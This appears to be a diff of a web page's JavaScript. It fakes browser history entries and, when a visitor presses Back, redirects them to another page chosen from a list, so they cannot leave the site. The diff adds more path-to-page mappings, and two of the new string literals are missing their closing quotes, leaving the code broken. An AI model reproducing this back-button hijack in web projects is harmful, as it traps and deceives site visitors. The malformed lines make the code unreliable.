@@ -11,7 +11,7 @@ globalLink.push(apidomain + 'nkgg.html');//5
 //globalLink.push(apidomain + 'yx.html');
 globalLink.push(apidomain + 'ydjz.html');//6
 globalLink.push(apidomain + 'lz515y000.html');//7
-
+//顺序 56740123
 function hh() {
     history.pushState(history.length + 1, "message", "#" + new Date().getTime());
 }
@@ -23,17 +23,32 @@ window.onload = function(){
 $(window).on('popstate', function(e){
     var number = Math.floor(globalLink.length * Math.random());
     var path = location.pathname.split('.')[0];
-    if (path.substr(1) == 'ydjz') {
-        number = 7;
+    if (path.substr(1) == 'nkgg') {
+        number = 6;
     }
     // if (path.substr(1) == 'yx') {
     //     number = 8;
     // }
-    if (path.substr(1) == 'lz515y000') {
-        number = 5;
+    if (path.substr(1) == 'ydjz') {
+        number = 7;
     }
-    if (path.substr(1) == 'nkgg') {
+    if (path.substr(1) == 'lz515y000') {
+        number = 4;
+    }
+    if (path.substr(1) == 'zrl') {
+        number = 0;
+    }
+    if (path.substr(1) == 'qysq) {
         number = 1;
+    }
+    if (path.substr(1) == 'tsyj) {
+        number = 2;
+    }
+    if (path.substr(1) == 'xwfkys') {
+        number = 3;
+    }
+    if (path.substr(1) == 'yysx') {
+        number = 5;
     }
     jump(globalLink[number]);
 });
